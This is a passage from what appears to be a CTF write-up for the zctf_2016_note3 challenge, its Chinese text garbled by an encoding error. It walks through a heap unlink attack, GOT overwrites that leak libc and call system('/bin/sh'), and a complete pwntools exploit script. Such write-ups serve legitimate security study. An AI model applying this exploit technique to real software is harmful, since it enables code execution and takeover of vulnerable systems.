†2çš„å¤§å°å’Œå®ƒçš„previous-in-useä½æ”¹æˆäº†0-ä¹Ÿå°±æ˜¯ä¸Šä¸€ä¸ªå †å †1æ²¡æœ‰ä½¿ç”¨" class="headerlink" title="è¦†ç›–åçš„å †å—æ˜¯é•¿è¿™æ ·çš„ï¼ŒæŠŠç¬¬å †2çš„å¤§å°å’Œå®ƒçš„previous in useä½æ”¹æˆäº†0,ä¹Ÿå°±æ˜¯ä¸Šä¸€ä¸ªå †å †1æ²¡æœ‰ä½¿ç”¨"></a>è¦†ç›–åçš„å †å—æ˜¯é•¿è¿™æ ·çš„ï¼ŒæŠŠç¬¬å †2çš„å¤§å°å’Œå®ƒçš„previous in useä½æ”¹æˆäº†0,ä¹Ÿå°±æ˜¯ä¸Šä¸€ä¸ªå †å †1æ²¡æœ‰ä½¿ç”¨</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFaDX.png" alt="image-20231014153740961.png"></p><h4 id="å½“åˆ æ‰å †2çš„æ—¶å€™ï¼Œå®ƒä¼šæ£€æŸ¥å †1çš„ä¸¤ä¸ªæŒ‡é’ˆï¼Œæ˜¯æ»¡è¶³æ¡ä»¶çš„ï¼Œå…¶ä¸­çš„0xbbb018è¿™ä¸ªåœ°å€å­˜æ”¾sizeçš„å¤§å°æ˜¯åŒ…æ‹¬åˆ°0xbbb0b0è¿™é‡Œçš„ï¼ˆçŒœæƒ³ï¼‰ï¼Œè€Œ0xbbb0c0è¿™é‡Œçš„å¤§å°æ˜¯previous-size-0xbbb0c8è¿™é‡Œè¡¨ç¤ºä¸Šä¸€ä¸ªå †æ²¡æœ‰ä½¿ç”¨ã€‚"><a href="#å½“åˆ æ‰å †2çš„æ—¶å€™ï¼Œå®ƒä¼šæ£€æŸ¥å †1çš„ä¸¤ä¸ªæŒ‡é’ˆï¼Œæ˜¯æ»¡è¶³æ¡ä»¶çš„ï¼Œå…¶ä¸­çš„0xbbb018è¿™ä¸ªåœ°å€å­˜æ”¾sizeçš„å¤§å°æ˜¯åŒ…æ‹¬åˆ°0xbbb0b0è¿™é‡Œçš„ï¼ˆçŒœæƒ³ï¼‰ï¼Œè€Œ0xbbb0c0è¿™é‡Œçš„å¤§å°æ˜¯previous-size-0xbbb0c8è¿™é‡Œè¡¨ç¤ºä¸Šä¸€ä¸ªå †æ²¡æœ‰ä½¿ç”¨ã€‚" class="headerlink" title="å½“åˆ æ‰å †2çš„æ—¶å€™ï¼Œå®ƒä¼šæ£€æŸ¥å †1çš„ä¸¤ä¸ªæŒ‡é’ˆï¼Œæ˜¯æ»¡è¶³æ¡ä»¶çš„ï¼Œå…¶ä¸­çš„0xbbb018è¿™ä¸ªåœ°å€å­˜æ”¾sizeçš„å¤§å°æ˜¯åŒ…æ‹¬åˆ°0xbbb0b0è¿™é‡Œçš„ï¼ˆçŒœæƒ³ï¼‰ï¼Œè€Œ0xbbb0c0è¿™é‡Œçš„å¤§å°æ˜¯previous size ,0xbbb0c8è¿™é‡Œè¡¨ç¤ºä¸Šä¸€ä¸ªå †æ²¡æœ‰ä½¿ç”¨ã€‚"></a>å½“åˆ æ‰å †2çš„æ—¶å€™ï¼Œå®ƒä¼šæ£€æŸ¥å †1çš„ä¸¤ä¸ªæŒ‡é’ˆï¼Œæ˜¯æ»¡è¶³æ¡ä»¶çš„ï¼Œå…¶ä¸­çš„0xbbb018è¿™ä¸ªåœ°å€å­˜æ”¾sizeçš„å¤§å°æ˜¯åŒ…æ‹¬åˆ°0xbbb0b0è¿™é‡Œçš„ï¼ˆçŒœæƒ³ï¼‰ï¼Œè€Œ0xbbb0c0è¿™é‡Œçš„å¤§å°æ˜¯previous size ,0xbbb0c8è¿™é‡Œè¡¨ç¤ºä¸Šä¸€ä¸ªå †æ²¡æœ‰ä½¿ç”¨ã€‚</h4><p><img src="zctf_2016_note3.assets/AJTB31Sv6tYn9Vu.png" alt="image-20231014161643622.png"></p><h4 id="å½“æŠŠå †2deleteæ—¶ï¼Œè¿™å‡ ä¸ªå †å°±ä¼šè¿›è¡Œåˆå¹¶deleä¹‹å‰ï¼Œbssæ®µä¸Šå­˜æ”¾å †æŒ‡é’ˆæ˜¯è¿™æ ·çš„å¸ƒå±€ã€‚"><a href="#å½“æŠŠå †2deleteæ—¶ï¼Œè¿™å‡ ä¸ªå †å°±ä¼šè¿›è¡Œåˆå¹¶deleä¹‹å‰ï¼Œbssæ®µä¸Šå­˜æ”¾å †æŒ‡é’ˆæ˜¯è¿™æ ·çš„å¸ƒå±€ã€‚" class="headerlink" title="å½“æŠŠå †2deleteæ—¶ï¼Œè¿™å‡ ä¸ªå †å°±ä¼šè¿›è¡Œåˆå¹¶deleä¹‹å‰ï¼Œbssæ®µä¸Šå­˜æ”¾å †æŒ‡é’ˆæ˜¯è¿™æ ·çš„å¸ƒå±€ã€‚"></a>å½“æŠŠå †2deleteæ—¶ï¼Œè¿™å‡ ä¸ªå †å°±ä¼šè¿›è¡Œåˆå¹¶deleä¹‹å‰ï¼Œbssæ®µä¸Šå­˜æ”¾å †æŒ‡é’ˆæ˜¯è¿™æ ·çš„å¸ƒå±€ã€‚</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFyAU.png" alt="image-20231014162533011.png"></p><h4 id="è€Œåœ¨dele-2-å"><a href="#è€Œåœ¨dele-2-å" class="headerlink" title="è€Œåœ¨dele(2)å"></a>è€Œåœ¨dele(2)å</h4><h4 id="å­˜æ”¾å †2çš„æŒ‡é’ˆè¢«ç½®é›¶äº†"><a href="#å­˜æ”¾å †2çš„æŒ‡é’ˆè¢«ç½®é›¶äº†" class="headerlink" title="å­˜æ”¾å †2çš„æŒ‡é’ˆè¢«ç½®é›¶äº†"></a>å­˜æ”¾å †2çš„æŒ‡é’ˆè¢«ç½®é›¶äº†</h4><p><img src="https://i.imgs.ovh/2023/10/14/rACx0.png" alt="image-20231014163605611.png"></p><h4 id="è¿™æ˜¯å †åˆå¹¶åçš„æ ·å­ï¼Œåº”è¯¥æ˜¯å †1å’Œå †2æ˜¯æ²¡æœ‰è¢«åˆ©ç”¨çš„ç„¶åå’Œå †0åˆå¹¶äº†"><a href="#è¿™æ˜¯å †åˆå¹¶åçš„æ ·å­ï¼Œåº”è¯¥æ˜¯å †1å’Œå †2æ˜¯æ²¡æœ‰è¢«åˆ©ç”¨çš„ç„¶åå’Œå †0åˆå¹¶äº†" class="headerlink" title="è¿™æ˜¯å †åˆå¹¶åçš„æ ·å­ï¼Œåº”è¯¥æ˜¯å †1å’Œå †2æ˜¯æ²¡æœ‰è¢«åˆ©ç”¨çš„ç„¶åå’Œå †0åˆå¹¶äº†"></a>è¿™æ˜¯å †åˆå¹¶åçš„æ ·å­ï¼Œåº”è¯¥æ˜¯å †1å’Œå †2æ˜¯æ²¡æœ‰è¢«åˆ©ç”¨çš„ç„¶åå’Œå †0åˆå¹¶äº†</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAPjC.png" alt="image-20231014163850174.png"></p><h4 id="0x151ä¹Ÿå°±æ˜¯ä¸­é—´0xbbb0c0è¿™é‡Œçš„å¤§å°ç›¸åŠ ä½†æ˜¯å †2è¿™é‡Œçš„å†…å­˜æ²¡æœ‰é‡Šæ”¾"><a href="#0x151ä¹Ÿå°±æ˜¯ä¸­é—´0xbbb0c0è¿™é‡Œçš„å¤§å°ç›¸åŠ ä½†æ˜¯å †2è¿™é‡Œçš„å†…å­˜æ²¡æœ‰é‡Šæ”¾" class="headerlink" title="0x151ä¹Ÿå°±æ˜¯ä¸­é—´0xbbb0c0è¿™é‡Œçš„å¤§å°ç›¸åŠ ä½†æ˜¯å †2è¿™é‡Œçš„å†…å­˜æ²¡æœ‰é‡Šæ”¾"></a>0x151ä¹Ÿå°±æ˜¯ä¸­é—´0xbbb0c0è¿™é‡Œçš„å¤§å°ç›¸åŠ ä½†æ˜¯å †2è¿™é‡Œçš„å†…å­˜æ²¡æœ‰é‡Šæ”¾</h4><h4 id="ä¹‹åçš„binæ˜¯è¿™æ ·çš„"><a href="#ä¹‹åçš„binæ˜¯è¿™æ ·çš„" class="headerlink" title="ä¹‹åçš„binæ˜¯è¿™æ ·çš„"></a>ä¹‹åçš„binæ˜¯è¿™æ ·çš„</h4><p><img src="zctf_2016_note3.assets/x8DgM9LaTris3oF.png" alt="image-20231014164403504.png"></p><h4 id="ç„¶åå°±å¯ä»¥ä»0x6020b0è¿™ä¸ªä½ç½®å®è¡Œä¿®æ”¹å †æŒ‡é’ˆä»è€Œå¯¹gotè¡¨çš„æ”¹å†™"><a href="#ç„¶åå°±å¯ä»¥ä»0x6020b0è¿™ä¸ªä½ç½®å®è¡Œä¿®æ”¹å †æŒ‡é’ˆä»è€Œå¯¹gotè¡¨çš„æ”¹å†™" class="headerlink" title="ç„¶åå°±å¯ä»¥ä»0x6020b0è¿™ä¸ªä½ç½®å®è¡Œä¿®æ”¹å †æŒ‡é’ˆä»è€Œå¯¹gotè¡¨çš„æ”¹å†™"></a>ç„¶åå°±å¯ä»¥ä»0x6020b0è¿™ä¸ªä½ç½®å®è¡Œä¿®æ”¹å †æŒ‡é’ˆä»è€Œå¯¹gotè¡¨çš„æ”¹å†™</h4><pre><code class="lang-py">payload3 = p64(0) * 2 + p64(elf.got[&#39;free&#39;]) * 2 + p64(elf.got[&#39;atoi&#39;]) + p64(0) + p64(elf.got[&#39;atoi&#39;])edit(0,payload3)</code></pre><p><img src="https://i.imgs.ovh/2023/10/14/rALVt.png" alt="image-20231014164701954.png"></p><h4 id="å†æŠŠeditå †0-ä¹Ÿå°±æ˜¯edit0x602018ï¼ˆfree-got-åœ°å€çš„å†…å®¹æ”¹å†™æˆ-0x400730-puts-plt"><a href="#å†æŠŠeditå †0-ä¹Ÿå°±æ˜¯edit0x602018ï¼ˆfree-got-åœ°å€çš„å†…å®¹æ”¹å†™æˆ-0x400730-puts-plt" class="headerlink" title="å†æŠŠeditå †0,ä¹Ÿå°±æ˜¯edit0x602018ï¼ˆfree_got)åœ°å€çš„å†…å®¹æ”¹å†™æˆ(0x400730)puts_plt"></a>å†æŠŠeditå †0,ä¹Ÿå°±æ˜¯edit0x602018ï¼ˆfree_got)åœ°å€çš„å†…å®¹æ”¹å†™æˆ(0x400730)puts_plt</h4><pre><code class="lang-py">edit(0,p64(0X400730)[:-1]) #puts_plt</code></pre><p><img src="https://i.imgs.ovh/2023/10/14/rAXkm.png" alt="image-20231014165150300"></p><h4 id="è¿™æ ·å†deleå †1çš„æ—¶å€™ä¹Ÿå°±æ˜¯free-0x6020d0è¿™ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯puts-elf-got-â€˜atoiâ€™-ä»è€Œè·å¾—atoiçš„goté¡¹çš„å†…å®¹ï¼Œä»è€Œå¯ä»¥ç®—å‡ºlibcçš„åç§»"><a href="#è¿™æ ·å†deleå †1çš„æ—¶å€™ä¹Ÿå°±æ˜¯free-0x6020d0è¿™ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯puts-elf-got-â€˜atoiâ€™-ä»è€Œè·å¾—atoiçš„goté¡¹çš„å†…å®¹ï¼Œä»è€Œå¯ä»¥ç®—å‡ºlibcçš„åç§»" class="headerlink" title="è¿™æ ·å†deleå †1çš„æ—¶å€™ä¹Ÿå°±æ˜¯free 0x6020d0è¿™ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯puts(elf.got[â€˜atoiâ€™]),ä»è€Œè·å¾—atoiçš„goté¡¹çš„å†…å®¹ï¼Œä»è€Œå¯ä»¥ç®—å‡ºlibcçš„åç§»"></a>è¿™æ ·å†deleå †1çš„æ—¶å€™ä¹Ÿå°±æ˜¯free 0x6020d0è¿™ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯puts(elf.got[â€˜atoiâ€™]),ä»è€Œè·å¾—atoiçš„goté¡¹çš„å†…å®¹ï¼Œä»è€Œå¯ä»¥ç®—å‡ºlibcçš„åç§»</h4><pre><code class="lang-py">atoi_addr = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))success(&#39;atoi_addr = &#39; + hex(atoi_addr))</code></pre><p><img src="https://i.imgs.ovh/2023/10/14/rArgN.png" alt="image-20231014165713253"></p><h4 id="ç„¶åå†editå †3ï¼Œä¹Ÿå°±æ˜¯0x6020e0è¿™ä¸ªåœ°å€ï¼Œæ›´æ”¹atoiçš„gotè¡¨çš„åœ°å€ä¸ºsytemï¼Œå†ä»å¼€å§‹æ—¶å€™èœå•æœ‰ä¸ªatoiå‡½æ•°ç„¶åå†™å…¥çš„å†…å®¹ä¸ºâ€˜-bin-shâ€™å°±å¯ä»¥ææƒäº†ã€‚"><a href="#ç„¶åå†editå †3ï¼Œä¹Ÿå°±æ˜¯0x6020e0è¿™ä¸ªåœ°å€ï¼Œæ›´æ”¹atoiçš„gotè¡¨çš„åœ°å€ä¸ºsytemï¼Œå†ä»å¼€å§‹æ—¶å€™èœå•æœ‰ä¸ªatoiå‡½æ•°ç„¶åå†™å…¥çš„å†…å®¹ä¸ºâ€˜-bin-shâ€™å°±å¯ä»¥ææƒäº†ã€‚" class="headerlink" title="ç„¶åå†editå †3ï¼Œä¹Ÿå°±æ˜¯0x6020e0è¿™ä¸ªåœ°å€ï¼Œæ›´æ”¹atoiçš„gotè¡¨çš„åœ°å€ä¸ºsytemï¼Œå†ä»å¼€å§‹æ—¶å€™èœå•æœ‰ä¸ªatoiå‡½æ•°ç„¶åå†™å…¥çš„å†…å®¹ä¸ºâ€˜/bin/shâ€™å°±å¯ä»¥ææƒäº†ã€‚"></a>ç„¶åå†editå †3ï¼Œä¹Ÿå°±æ˜¯0x6020e0è¿™ä¸ªåœ°å€ï¼Œæ›´æ”¹atoiçš„gotè¡¨çš„åœ°å€ä¸ºsytemï¼Œå†ä»å¼€å§‹æ—¶å€™èœå•æœ‰ä¸ªatoiå‡½æ•°ç„¶åå†™å…¥çš„å†…å®¹ä¸ºâ€˜/bin/shâ€™å°±å¯ä»¥ææƒäº†ã€‚</h4><h4 id="æœ€åçš„exp"><a href="#æœ€åçš„exp" class="headerlink" title="æœ€åçš„exp"></a>æœ€åçš„exp</h4><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./zctf_2016_note3&quot;)elf=ELF(&#39;./zctf_2016_note3&#39;)libc=ELF(&#39;./libc-2.23.so&#39;)context.log_level=&quot;debug&quot;def add(size,content):    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)    p.sendlineafter(&#39;Input the length of the note content:(less than 1024)&#39;,str(size))    p.sendlineafter(&#39;Input the note content:&#39;,content)def edit(index,content):    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;3&#39;)    p.sendlineafter(&#39;Input the id of the note:&#39;,str(index))    p.sendlineafter(&#39;Input the new content:&#39;,content)def dele(index):    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;4&#39;)    p.sendlineafter(&#39;Input the id of the note:&#39;,str(index))ptr=0x6020c8fd=ptr-0x18bk=ptr-0x10payload1=p64(0)+p64(0xb1)+p64(fd)+p64(bk)add(0x90,payload1)add(0,&#39;bbbb&#39;)add(0x90,&#39;CCCC&#39;)add(0x10,&#39;dddd&#39;)dele(1)payload2=p64(0)*2+p64(0xb0)+p64(0xa0)add(0,payload2) dele(2)  #he bingpayload3 = p64(0) * 2 + p64(elf.got[&#39;free&#39;]) * 2 + p64(elf.got[&#39;atoi&#39;]) + p64(0) + p64(elf.got[&#39;atoi&#39;])edit(0,payload3)edit(0,p64(0X400730)[:-1]) #puts_pltdele(1)  #dele di 0 ge dui atoi_addr = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))success(&#39;atoi_addr = &#39; + hex(atoi_addr))#gdb.attach(p)sleep(1)base=atoi_addr-libc.sym[&#39;atoi&#39;]system=base+libc.sym[&#39;system&#39;]edit(3,p64(system))p.sendline(&#39;/bin/sh&#39;)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
